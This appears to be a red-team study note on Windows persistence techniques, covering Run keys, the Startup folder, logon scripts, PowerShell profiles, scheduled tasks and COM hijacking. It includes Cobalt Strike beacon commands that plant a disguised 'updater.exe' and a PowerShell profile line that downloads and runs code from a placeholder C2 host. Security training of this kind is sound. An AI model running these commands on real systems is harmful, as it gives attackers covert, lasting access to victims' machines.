# Persistance


Persistence is about **survivability**.

Initial access is fragile:

- Payloads die
- Users reboot
- Network drops
- SOC kicks you out

A mature attacker **plans for failure** and ensures access _comes back automatically_.

From a MITRE perspective, this is **Persistence (TA0003)**, techniques that allow execution **across reboots, logons, or interruptions**.

ğŸ§  **Red team mindset**  

> If you cannot reliably re-enter the environment, your access is temporary, not an operation.


### Boot & Logon Autostart Execution (T1547): Auto-Run Magic on Startup

This is a powerhouse tactic where you hook into system events like boot or logon to fire off your payload automatically. MITRE lists 15 sub-techniques (from my research on attack.mitre.org), but CRTO zooms in on user-level ones. 

Why it works: Windows is built for convenience, apps need to start seamlessly, so adversaries piggyback on that. When it shines: Long-haul ops where reboots are common. Fails if: AV spots the changes or user notices weird processes.

Basically, Attackers **abuse what already exists** instead of adding new components.

#### ğŸ§± Registry Run Keys

Windows checks specific registry locations **every time a user logs in** to decide what to launch automatically.

**Common user-level keys:**

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

- **Run** â†’ Executes on _every_ login
- **RunOnce** â†’ Executes _once_, then deletes itself


What Weâ€™re Doing (Step-by-Step Thinking)

```
beacon> cd C:\Users\dr34m\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe

beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
Setting registry key \\.\0000000080000001\Software\Microsoft\Windows\CurrentVersion\Run\Updater with type 1
Successfully set regkey
SUCCESS.
```

**Commands Explained:**

- User uploads a beacon payload to the `WindowsApps` folder.
- `http_x64.exe` is a cobalt strike's HTTP listener for c2 callbacks.
- rename for opsec, looks like a legit updater; why it works: Evades simple name-based detection.
- At logon, Windows enumerates Run keys and executes the data (your exe path). Persistent across reboots unlike temp sessions. RunOnce? One-time use, auto-deletes, great for cleanup.

##### ğŸš¨ Blue Team Visibility

Defenders may detect:

- Registry modification events
- Autoruns enumeration
- EDR baseline drift
    
But:

- HKCU noise is high
- User software legitimately uses this key

##### ğŸ§¹ Cleanup

Always clean up:

`reg_delete`

Leaving persistence after objectives are met is **sloppy tradecraft**.


#### ğŸ“‚ 2. Startup Folder Persistence

Simpler than registry no keys, just drop files in a magic folder that auto-runs on logon.

Windows runs **everything** inside:

```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

â€¦when the user logs in.

##### ğŸ›  How This Works

You simply:

- Drop an executable there
- Windows executes it automatically

No registry. No config. No magic.


#### ğŸ” 3. Logon Script via Environment Key


Windows supports **logon scripts** using:

```
HKCU\Environment\UserInitMprLogonScript
```

Anything referenced here executes **when the user logs in**.

So with beacon we can do:

```
beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe
```

- _Why?_ `UserInitMprLogonScript` is a special var in `HKCU\Environment`, Windows runs it as a logon script if set. REG_EXPAND_SZ for env expansion.
- Works because: Logon process (winlogon.exe) checks this for Netlogon-like behavior, but user-level.

#### ğŸŸ¦ 4. PowerShell Profile Persistence 


PowerShell loads a **profile script** every time a new PowerShell session starts.

Typical location:

```
$HOME\Documents\WindowsPowerShell\Profile.ps1
```

**Setup:**

- Check/create dir: 

```
beacon> ls C:\Users\<username>\Documents (see if WindowsPowerShell exists).

beacon> mkdir C:\Users\<username>\Documents\WindowsPowerShell

beacon> cd C:\Users\<username>\Documents\WindowsPowerShell

```

- Craft profile.ps1:

Avoid blocking code, use Start-Job for background: 

```
$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://your.c2/payload") }
```

 (downloads and execs remotely, why? Non-blocking, evades disk writes).

- Lastly just upload:

```
beacon> upload C:\Payloads\Profile.ps1
```


**Why it works:** PS loads `profile.ps1` from paths like `$HOME\Documents\WindowsPowerShell` on new sessions. When? Every PS window (e.g., via explorer or cmd). 

**Extra:** MITRE research shows **APT41** uses this. 



#### â° 5. Scheduled Tasks 

Automate tasks on triggers, legit for updates, malicious for us.


**XML Basics:** Define in XML: Triggers (e.g., logon), Actions (exec your exe), Principals (user context).

- Example XML: As in contentâ€”set Command to your payload path, UserId to target user.

**Command:**

- Use CS's schtaskscreate BOF: 

```
beacon> schtaskscreate \Beacon XML CREATE 
```

(pops file dialog for XML upload; \Beacon is task nameâ€”must start with \ for root)

- Why? Creates task via API calls stealthier than schtasks.exe (which logs more).
- Works because: Task Scheduler service parses XML and schedules.

- Cleanup: 

```
beacon> schtasksdelete \Beacon
```


#### ğŸ§¬ 6. COM Hijacking ;  Advanced but Powerful


Advanced: Hijack Component Object Model references to load your DLL instead of legit ones.

##### ğŸ§  First: Understand COM (Simply)

COM is:

- A Windows component system
- Programs request functionality by **CLSID**
- Windows loads the associated DLL/EXE

Think:

> â€œI ask Windows for X, it loads Yâ€


##### ğŸ”‘ Key Detail (Critical)

COM resolution order:

```
1. HKCU\Software\Classes
2. HKLM\Software\Classes
```

ğŸ‘‰ **User keys override machine keys**


##### ğŸ¯ Hijacking Opportunity

If:

- A CLSID exists in HKLM
- But **not** in HKCU

You can:

- Create it in HKCU
- Point it to _your_ DLL
    
Windows obeys.

##### ğŸ” Finding Targets (Procmon Logic)

Look for:

- `RegOpenKey` 
- `InprocServer32` or `LocalServer32`
- `NAME NOT FOUND`
    
This tells you:

> â€œWindows expected a COM object that doesnâ€™t existâ€

Thatâ€™s your opening.

Example `CLSID: {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}` (loaded by DllHost.exe, exists in HKLM but not HKCU).


